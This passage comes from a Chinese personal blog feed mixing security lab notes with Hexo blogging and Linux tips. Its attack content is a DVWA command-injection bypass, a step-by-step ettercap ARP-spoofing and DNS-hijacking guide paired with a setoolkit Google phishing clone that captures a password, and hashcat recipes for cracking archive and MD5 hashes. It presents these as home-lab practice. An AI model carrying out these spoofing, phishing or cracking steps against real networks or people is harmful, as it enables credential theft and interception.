<img src="/images/pasted-42.png" alt="upload successful"></p>
<h2 id="High等级">High等级</h2>
<p>连接符连接都不执行,已处理所有连接符<br>
<img src="/images/pasted-43.png" alt="upload successful"></p>
<h3 id="解决方法-2">解决方法</h3>
<p>其实|是没处理的，加了空格，所以还是能够执行的<br>
<img src="/images/pasted-44.png" alt="upload successful"></p>
<p>执行结果：<br>
<img src="/images/pasted-45.png" alt="upload successful"></p>
<h2 id="Impossible等级">Impossible等级</h2>
<p>是不可能等级，这个采用的是白名单的方式防护，只允许已知的命令执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    // Split the IP into 4 octects</span><br><span class="line">    $octet = explode( &quot;.&quot;, $target );</span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an integer</span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;</span><br><span class="line">        // If all 4 octets are int&#x27;s put the IP back together.</span><br><span class="line">        $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3];</span><br><span class="line"></span><br><span class="line">        // Determine OS and execute the ping command.</span><br><span class="line">        if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">            // Windows</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // *nix</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Feedback for the end user</span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Ops. Let the user name theres a mistake</span><br><span class="line">        echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全</category>
        <category>dvwa</category>
      </categories>
      <tags>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title>ettercap arp欺骗+dns劫持+钓鱼网站</title>
    <url>/2024/10/15/ettercap-arp%E6%AC%BA%E9%AA%97-dns%E5%8A%AB%E6%8C%81-%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>这次主要是使用ettercap在局域网中发现主机并欺骗其arp表，让其mac地址与攻击主机mac一致，使用dns污染其dns解析，将其访问的域名解析到本机的钓鱼网站中。</p>
<p>注意！<br>
ettercap使用要一次完成，在多次测试中发现，重新arp欺骗会无法生效，原因不知。</p>
<h2 id="步骤">步骤</h2>
<h3 id="发现局域网主机">发现局域网主机</h3>
<p>在kali中打开ettercap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ettercap -G</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-46.png" alt="upload successful"></p>
<p>选择对应的接口，点击√号，再点击放大镜，再点击服务器<br>
<img src="/images/pasted-47.png" alt="upload successful"></p>
<p>192.168.0.1:网关<br>
192.168.0.197:靶机</p>
<h3 id="arp欺骗">arp欺骗</h3>
<p>点击靶机，再点击add to target1<br>
点击网关，再点击add to target2<br>
<img src="/images/pasted-48.png" alt="upload successful"></p>
<p>点击地球图标，点击arp poisoning，点击ok<br>
<img src="/images/pasted-49.png" alt="upload successful"><br>
<img src="/images/pasted-50.png" alt="upload successful"></p>
<p>可在靶机上查看arp表，发现网关mac和本机mac一致，欺骗成功；但是访问正常，可能会短暂无法访问互联网。</p>
<h3 id="制作钓鱼网站">制作钓鱼网站</h3>
<p>使用setoolkit社工软件制作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setoolkit</span><br></pre></td></tr></table></figure>
<p>来个好看的封面<br>
<img src="/images/pasted-51.png" alt="upload successful"></p>
<p>选择1<br>
<img src="/images/pasted-52.png" alt="upload successful"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）Social-Engineering Attacks：社会工程学攻击</span><br><span class="line">2）Penetration Testing(Fast-Track)：渗透测试（快速通道）</span><br><span class="line">3）Third Party Modules：第三模块</span><br><span class="line">4）Update the Social-Engineer Toolkit：更新社会工程学工具包</span><br><span class="line">5）Update SET configuration：更新SET配置</span><br><span class="line">6）Help, Credits, and About：帮助、致谢和关于</span><br><span class="line"></span><br><span class="line">99）Exit the Social-Engineer Toolkit：退出</span><br></pre></td></tr></table></figure>
<p>选择2<br>
<img src="/images/pasted-53.png" alt="upload successful"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）鱼叉式网络钓鱼攻击向量</span><br><span class="line">2）网站攻击向量</span><br><span class="line">3）感染性媒体生成器</span><br><span class="line">4）创建载荷和监听器</span><br><span class="line">5）批量邮件攻击</span><br><span class="line">6）基于Arduino的攻击向量</span><br><span class="line">7）无线接入点攻击向量</span><br><span class="line">8）QR码生成器攻击向量</span><br><span class="line">9）PowerShell攻击向量</span><br><span class="line">10）第三方模块</span><br><span class="line"></span><br><span class="line">99）返回主菜单。</span><br></pre></td></tr></table></figure>
<p>选择3<br>
<img src="/images/pasted-54.png" alt="upload successful"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）Java小程序攻击方法</span><br><span class="line">2）Metasploit浏览器漏洞利用方法</span><br><span class="line">3）凭证收集攻击方法</span><br><span class="line">4）Tabnabbing攻击方法</span><br><span class="line">5）Web劫持攻击方法</span><br><span class="line">6）多攻击网络方法</span><br><span class="line">7）HTA攻击方法</span><br><span class="line"></span><br><span class="line">99）返回主菜单</span><br></pre></td></tr></table></figure>
<p>随意，我这里选择1，比较方便<br>
<img src="/images/pasted-55.png" alt="upload successful"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）网络模板</span><br><span class="line">2）网站克隆器</span><br><span class="line">3）自定义导入</span><br><span class="line"></span><br><span class="line">99）返回网络攻击菜单</span><br></pre></td></tr></table></figure>
<p>然后输入要被访问的ip，选择谷歌模板，网站制作完成。<br>
<img src="/images/pasted-56.png" alt="upload successful"></p>
<h3 id="dns劫持">dns劫持</h3>
<p>配置ettercap的dns劫持配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure>
<p>末尾添加以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*	A	192.168.0.194</span><br></pre></td></tr></table></figure>
<p>意思是所有域名均解析成后面的ip<br>
<img src="/images/pasted-57.png" alt="upload successful"></p>
<p>点击软件三个点，然后选择plugins，再选择manage plugins<br>
<img src="/images/pasted-59.png" alt="upload successful"></p>
<p>双击dns_spoof即可<br>
<img src="/images/pasted-60.png" alt="upload successful"></p>
<h2 id="验证">验证</h2>
<h3 id="因为创建的是80端口的页面，靶机要输入http-域名">因为创建的是80端口的页面，靶机要输入<a href="http://xn--+-j68a70j">http://+域名</a></h3>
<p><img src="/images/pasted-63.png" alt="upload successful"></p>
<h3 id="工具会有劫持成功的返回">工具会有劫持成功的返回</h3>
<p><img src="/images/pasted-62.png" alt="upload successful"></p>
<h3 id="拿到密码">拿到密码</h3>
<p><img src="/images/pasted-61.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>娱乐</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>ettercap</tag>
      </tags>
  </entry>
  <entry>
    <title>dvwa-部署（docker）</title>
    <url>/2024/10/14/dvwa-%E9%83%A8%E7%BD%B2%EF%BC%88docker%EF%BC%89/</url>
    <content><![CDATA[<h2 id="拉取镜像">拉取镜像</h2>
<p>发现配置了镜像加速也无法通过search查到镜像，但是下载没问题，通过网上查询镜像名称下载即可：</p>
<pre><code>https://hub.docker.com/
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull docker pull sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
<h2 id="运行容器">运行容器</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name dvwa -p 8080:80 sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
<p>默认账号密码</p>
<pre><code>dvwa/dvwa
admin/password
</code></pre>
<h2 id="许可证">许可证</h2>
<p>通过网上使用方法使用其他人的密钥发现导入无法使用，可能是方式有问题，我是用的镜像提供的命令导入密钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name dvwa -p 8080:80 -e RECAPTCHA_PUBLIC_KEY=YOUR_KEY -e RECAPTCHA_PRIVATE_KEY=YOUR_KEY sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
<p>网上的使用方法<br>
在DVWA-master/config/config.inc.php文件中找到下面代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27; &#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27; &#x27;;</span><br></pre></td></tr></table></figure>
<p>将其修改为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全</category>
        <category>dvwa</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title>github部署hexo</title>
    <url>/2024/08/02/github%E9%83%A8%E7%BD%B2hexo/</url>
    <content><![CDATA[<h2 id="本地ssh连接-GitHub">本地ssh连接 GitHub</h2>
<h3 id="创建密钥">创建密钥</h3>
<p>确保下载了git后输入命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;你的 GitHub 用户名&quot;</span><br><span class="line">git config --global user.email &quot;你的 GitHub 邮箱&quot;</span><br></pre></td></tr></table></figure>
<p>这一步windows需要设置ssh用户名和，不确定要不要指定密钥文件：</p>
<ol>
<li>用户名执行命令：</li>
</ol>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">git config --global --add safe.directory D:/hexo/.deploy_git</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>指定密钥文件，在保存密钥文件的目录中创建文件：config</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">  HostName github.com</span><br><span class="line">  User git</span><br><span class="line">  IdentityFile ~/.ssh/id_rsa</span><br><span class="line">  IdentitiesOnly yes</span><br></pre></td></tr></table></figure>
<p>创建 SSH 密匙（可以-f指定输出目录）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;你的 GitHub 邮箱&quot;</span><br></pre></td></tr></table></figure>
<p>什么都不用管，一路回车就行，创建好之后可以在.ssh看到有id_rsa.pub(.pub是公钥，id_rsa是私钥)。<br>
打开 id_rsa.pub 并复制里面的内容。</p>
<h3 id="在-GitHub-中添加-SSH-密钥">在 GitHub 中添加 SSH 密钥</h3>
<p>回到 GitHub，进入 Settings：<br>
<img src="/images/pasted-11.png" alt="upload successful"></p>
<p>选择左边栏的 SSH and GPG keys，点击 New SSH key：<br>
<img src="/images/pasted-12.png" alt="upload successful"></p>
<p>Title 随便取，然后把 id_rsa.pub 里面的内容到复制到 Key 中，点击 Add SSH key：<br>
<img src="/images/pasted-13.png" alt="upload successful"></p>
<p>保存完毕本地验证一下连接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
<p>出现 “Are you sure……”，输入 yes 回车确认，若出现下图的提示即连接成功：<br>
<img src="/images/pasted-14.png" alt="upload successful"></p>
<h2 id="创建-GitHub-仓库">创建 GitHub 仓库</h2>
<p>GitHub 的主页 repository 中点击右上角的 New：<br>
<img src="/images/pasted-15.png" alt="upload successful"></p>
<p>填写基本信息:<br>
Repository name <a href="http://xn--fiq51fkycnswykwlh0b.github.io">中输入用户名.github.io</a>，一定要是这个名字！<br>
勾选 Add a README file<br>
<img src="/images/pasted-16.png" alt="upload successful"></p>
<p>填好后点击 Create repository 创建仓库</p>
<h2 id="上传-hexo-程序到-GitHub">上传 hexo 程序到 GitHub</h2>
<p>需要先安装 hexo-deployer-git：</p>
<pre><code>npm install hexo-deployer-git --save
</code></pre>
<p>修改_config.yml 文件末尾的 Deployment 部分：<br>
<img src="/images/pasted-17.png" alt="upload successful"></p>
<p>修改成如下（修改为你的用户名与仓库名）<br>
<img src="/images/pasted-18.png" alt="upload successful"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">   type: git</span><br><span class="line">   repo: git@github.com:w00123/w00123.github.io.git</span><br><span class="line">   branch: gh-pages</span><br></pre></td></tr></table></figure>
<p>修改完成保存后运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo c</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>出现下面的提示说明已经把网站上传到 GitHub 了：<br>
<img src="/images/pasted-19.png" alt="upload successful"></p>
<p>然后我们需要在库设置（Repository Settings）中将默认分支设置为_config.yml 配置中的分支名称。<br>
<img src="/images/pasted-20.png" alt="upload successful"></p>
<p>然后在 pages 页面调整源分支：<br>
<img src="/images/pasted-21.png" alt="upload successful"></p>
<p>访问用户名.github.io就可以看到默认 hexo 了。</p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>github</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo-gitee部署</title>
    <url>/2025/06/20/hexo-gitee%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<h2 id="导语">导语</h2>
<p>与github的部署方式一样，仅是代码仓库的设置有些许不同，并且gitee上需要单独开启gitee pages，并且要实名认证，目前<code>pages服务暂停了</code>。</p>
<blockquote>
<p>gitee pages已暂停服务，无法通过其访问</p>
<blockquote>
<p>参考文章：<a href="https://cloud.tencent.com/developer/article/2495238">https://cloud.tencent.com/developer/article/2495238</a></p>
</blockquote>
</blockquote>
<hr>
<h2 id="配置方法">配置方法</h2>
<p>hexo的创建和deploy的配置和github一样，可以参考<a href="/2024/08/02/github%E9%83%A8%E7%BD%B2hexo/">github部署hexo</a></p>
<ul>
<li>注意git name和email</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;你的 gitee 用户名&quot;</span><br><span class="line">git config --global user.email &quot;你的 gitee 邮箱&quot;</span><br></pre></td></tr></table></figure>
<h3 id="创建仓库">创建仓库</h3>
<p>创建gitee仓库，需要注意一点不一样的是，仓库名称不需要和github一样格式<br>
我起的名称是haha_w</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Github:	&#123;username&#125;.github.io</span><br><span class="line">gitee:	&#123;username&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修改yml">修改yml</h3>
<p>根目录中<code>_config.yml</code>的deploy的配置需要修改一下，这样可以同时更新两个仓库</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span></span><br><span class="line">    <span class="attr">gitee:</span> <span class="string">https://gitee.com/haha_w/haha_w.git,master</span></span><br><span class="line">    <span class="attr">github:</span> <span class="string">git@github.com:w00123/w00123.github.io.git,master</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">gh-pages</span></span><br></pre></td></tr></table></figure>
<h3 id="创建SSH-key">创建SSH key</h3>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;<span class="number">15967126</span>+haha_w@user.noreply.gitee.com&quot;</span><br></pre></td></tr></table></figure>
<p>上传公钥到gitee，测试可以用以下命令测试：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ssh -T git@gitee.com</span><br></pre></td></tr></table></figure>
<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>完成配置</p>
</div>
<hr>
<h2 id="上传代码仓库">上传代码仓库</h2>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">hexo cl</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>gitee</tag>
      </tags>
  </entry>
  <entry>
    <title>分区命令</title>
    <url>/2025/01/15/fdisk/</url>
    <content><![CDATA[<h2 id="fdisk">fdisk</h2>
<h3 id="命令格式">命令格式</h3>
<p>fdisk 路径 参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sdb</span><br></pre></td></tr></table></figure>
<p>一般配合使用的有<br>
df -h<br>
lsblk<br>
mkfs.ext4<br>
…</p>
<h3 id="帮助">帮助</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分区操作类</span><br><span class="line">a：切换分区的启动标志。当需要设置某个分区为可启动分区时使用，比如在多系统安装时指定引导系统所在的分区。</span><br><span class="line">d：删除一个分区。当分区不再需要或需要重新划分磁盘空间时，可用来删除现有分区，但此操作会丢失该分区上的数据。</span><br><span class="line">n：添加一个新的分区。可用于在磁盘上创建新的存储空间区域，需指定分区类型（主分区、扩展分区或逻辑分区等）、起始扇区和结束扇区等信息。</span><br><span class="line">t：改变分区的系统标识（系统ID）。不同的系统ID代表不同的文件系统类型或分区用途，如 Linux、Windows、交换分区等，通过修改系统ID可让操作系统正确识别分区类型。</span><br><span class="line"></span><br><span class="line">分区表操作类</span><br><span class="line">g：创建一个新的空的 GPT（GUID Partition Table）分区表。GPT 是一种较新的分区表格式，支持大于 2TB 的分区，适用于大容量磁盘。</span><br><span class="line">G：创建一个 IRIX（SGI）分区表。IRIX 是一种 Unix 操作系统，该命令用于创建适用于该系统的特殊分区表。</span><br><span class="line">o：创建一个新的空的 DOS 分区表。DOS 分区表是传统的分区表格式，广泛应用于早期的 Windows 系统等，最多支持 4 个主分区或 3 个主分区加 1 个扩展分区。</span><br><span class="line"></span><br><span class="line">显示与验证类</span><br><span class="line">l：列出已知的分区类型。可帮助用户了解各种系统ID对应的分区类型，以便在修改分区系统ID时进行参考。</span><br><span class="line">p：打印分区表。显示磁盘上当前的分区信息，包括分区编号、起始扇区、结束扇区、分区大小、系统ID等，方便用户查看磁盘分区布局。</span><br><span class="line">v：验证分区表。检查分区表的完整性和正确性，如分区是否有重叠、分区表格式是否正确等，确保磁盘分区结构的稳定性。</span><br><span class="line"></span><br><span class="line">其他操作类</span><br><span class="line">b：编辑 BSD disklabel。BSD 是一种 Unix 类操作系统，该命令用于编辑其特有的磁盘标签，进行更细致的分区管理。</span><br><span class="line">c：切换 DOS 兼容性标志。在某些情况下，可能需要调整分区表的兼容性设置，以确保在不同系统或工具下能正确识别磁盘分区。</span><br><span class="line">q：退出而不保存更改。当用户在操作过程中发现错误或不想修改分区信息时，可选择此命令退出工具，之前所做的更改不会被写入磁盘。</span><br><span class="line">s：创建一个新的空的 Sun disklabel。Sun 是一种 Unix 工作站，该命令用于创建其特有的磁盘标签。</span><br><span class="line">u：改变显示/输入单位。可切换单位如扇区、KB、MB、GB 等，方便用户根据需要更直观地查看和设置分区大小等信息。</span><br><span class="line">w：将分区表写入磁盘并退出。当完成所有分区操作且确认无误后，使用此命令将更改保存到磁盘，使新的分区布局生效。</span><br><span class="line">x：额外功能（仅限专家使用）。包含一些高级的、不常用的分区操作选项，普通用户一般不建议使用，除非对分区操作非常熟悉。</span><br></pre></td></tr></table></figure>
<h2 id="逻辑卷">逻辑卷</h2>
<p>创建常用命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb1</span><br><span class="line">pvs</span><br><span class="line"></span><br><span class="line">vgcreate vgtest /dev/sdb1</span><br><span class="line">vgs</span><br><span class="line"></span><br><span class="line">lvcreate -L 4G -n lvtest01 vgtest</span><br><span class="line">lvcreate -l 100%FREE -n lvtest02 vgtest</span><br><span class="line">lvs</span><br></pre></td></tr></table></figure>
<p>删除常用命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvremove /dev/vgtest/lvtest01</span><br><span class="line">vgremove  vgtest</span><br><span class="line">pvremove /dev/sdb1</span><br></pre></td></tr></table></figure>
<h2 id="常见错误">常见错误</h2>
<h3 id="设备或资源忙">设备或资源忙</h3>
<p>如果有返回：</p>
<pre><code>The partition table has been altered!

Calling ioctl() to re-read partition table.

WARNING: Re-reading the partition table failed with error 16: 设备或资源忙.
The kernel still uses the old table. The new table will be used at
the next reboot or after you run partprobe(8) or kpartx(8)
</code></pre>
<p>重新识别磁盘即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">partprobe /dev/sdb</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo-github贡献日历</title>
    <url>/2025/02/12/hexo-github%E8%B4%A1%E7%8C%AE%E6%97%A5%E5%8E%86/</url>
    <content><![CDATA[<h2 id="预览">预览</h2>
<p><img src="/images/pasted-84.png" alt="upload successful"></p>
<h2 id="安装依赖">安装依赖</h2>
<p>执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-githubcalendar --save</span><br></pre></td></tr></table></figure>
<h2 id="添加配置">添加配置</h2>
<p>要放到hexo根目录下_config.yml文件，非主题:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">githubcalendar:</span><br><span class="line">  enable: true        # 是否启用本插件</span><br><span class="line">  enable_page: /      # 要生效的页面，如 / 首页，/about/ 介绍页等</span><br><span class="line">  user: w00123   # GitHub 用户名</span><br><span class="line">  layout:</span><br><span class="line">    type: id</span><br><span class="line">    name: recent-posts</span><br><span class="line">    index: 0</span><br><span class="line">  githubcalendar_html: &#x27;&lt;div class=&quot;recent-post-item&quot; style=&quot;width:100%;height:auto;padding:10px;&quot;&gt;&lt;div id=&quot;github_loading&quot; style=&quot;width:10%;height:100%;margin:0 auto;display: block&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;  viewBox=&quot;0 0 50 50&quot; style=&quot;enable-background:new 0 0 50 50&quot; xml:space=&quot;preserve&quot;&gt;&lt;path fill=&quot;#d0d0d0&quot; d=&quot;M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z&quot; transform=&quot;rotate(275.098 25 25)&quot;&gt;&lt;animateTransform attributeType=&quot;xml&quot; attributeName=&quot;transform&quot; type=&quot;rotate&quot; from=&quot;0 25 25&quot; to=&quot;360 25 25&quot; dur=&quot;0.6s&quot; repeatCount=&quot;indefinite&quot;&gt;&lt;/animateTransform&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/div&gt;&lt;div id=&quot;github_container&quot;&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span><br><span class="line">  pc_minheight: 280px</span><br><span class="line">  mobile_minheight: 0px</span><br><span class="line">  # 贡献统计的梯度色卡值，可自行调整</span><br><span class="line">  color: &quot;[&#x27;rgba(255, 255, 255, 0.3)&#x27;, &#x27;#fdcdec&#x27;, &#x27;#fc9bd9&#x27;, &#x27;#fa6ac5&#x27;, &#x27;#f838b2&#x27;, &#x27;#f5089f&#x27;, &#x27;#c4067e&#x27;, &#x27;#92055e&#x27;, &#x27;#540336&#x27;, &#x27;#48022f&#x27;, &#x27;#30021f&#x27;]&quot; </span><br><span class="line">  # 推荐填写你自建的API接口，公用api随时可能会失效</span><br><span class="line">  # api: https://github-calendar-api.meta-code.top/api</span><br><span class="line">  api: https://githubcalendarapi.shiguang666.eu.org/api</span><br><span class="line">  # 推荐下载后使用本地文件</span><br><span class="line">  # calendar_js: https://cdn.jsdelivr.net/gh/barry-flynn/hexo-github-calendar/hexo_githubcalendar.js # 在线文件，容易加载失败</span><br><span class="line">  calendar_js: /js/hexo_githubcalendar.js # 本地文件，请下载到主题文件夹的source目录下</span><br><span class="line">  plus_style: &quot;&quot;</span><br></pre></td></tr></table></figure>
<h2 id="自建api">自建api</h2>
<blockquote>
<p>github作者：<a href="https://github.com/Zfour/python_github_calendar_api?tab=readme-ov-file">https://github.com/Zfour/python_github_calendar_api?tab=readme-ov-file</a><br>
测试方法未根据作者提供的url，在建好的url后加上<code>/api?user=</code></p>
</blockquote>
<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>如果报错500，可根据这位时光大佬的操作修改：<a href="https://www.cnblogs.com/an-shiguang/p/18269053">https://www.cnblogs.com/an-shiguang/p/18269053</a></p>
</div>
<h2 id="记录500错误处理方法">记录500错误处理方法</h2>
<h4 id="进入项目选择setting">进入项目选择setting</h4>
<p>下拉找到<code>Node.js Version</code>修改版本为18.0<br>
<img src="/images/pasted-82.png" alt="upload successful"></p>
<h4 id="重新部署">重新部署</h4>
<p>项目中选择<code>Deployments</code>点击<code>Redeploy</code>即可<br>
<img src="/images/pasted-83.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hashcat爆破压缩包</title>
    <url>/2025/02/26/hashcat%E7%88%86%E7%A0%B4%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
    <content><![CDATA[<h2 id="hashcat下载">hashcat下载</h2>
<p>windows需要下载两个工具，一个<code>hashcat</code>，一个<code>John the Ripper</code>，下面是下载地址：</p>
<blockquote>
<p>hashcat<br>
<a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p>
</blockquote>
<blockquote>
<p>John the Ripper<br>
<a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a></p>
</blockquote>
<h2 id="hashcat使用">hashcat使用</h2>
<h3 id="获取hash值">获取hash值</h3>
<ol>
<li>通过John the Ripper工具获取hash</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rar2john.exe &lt;文件名&gt;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>通过windows命令获取md5值</li>
</ol>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -hashfile &lt;文件&gt; MD5</span><br></pre></td></tr></table></figure>
<h3 id="参数">参数</h3>
<ol>
<li>-m<br>
选择hash模式，通过hash值计算，可以通过命令自动运算</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat &lt;hash值&gt;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>-a<br>
选择攻击模式<br>
|参数|含义|<br>
|:-:|:—|<br>
|-a 0|字典破解|<br>
|-a 1|多字典组合破解|<br>
|-a 3|掩码破解|<br>
|-a 6|字典+掩码破解|<br>
|-a 7|掩码+字典破解|</li>
</ol>
<h3 id="限制密码长度范围爆破">限制密码长度范围爆破</h3>
<p>rar hash值爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 13000 -a 3 &lt;hash值&gt; ?a?a?a?a?a?a --increment --increment-min 4 --increment-max 6</span><br></pre></td></tr></table></figure>
<h3 id="MD5未知密码爆破">MD5未知密码爆破</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hash -m 0 -a 3 &lt;MD5值&gt; -O</span><br></pre></td></tr></table></figure>
<h3 id="上次中断处开始">上次中断处开始</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 13000 -a 3 --restore</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>hashcat</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo-butterfly美化</title>
    <url>/2024/08/03/hexo-butterfly%E7%BE%8E%E5%8C%96/</url>
    <content><![CDATA[<h2 id="hexo博客一图流">hexo博客一图流</h2>
<h3 id="实现效果展示">实现效果展示</h3>
<p>头部背景与主体部分背景无缝连接<br>
<img src="/images/pasted-22.png" alt="upload successful"></p>
<h3 id="实现方法">实现方法</h3>
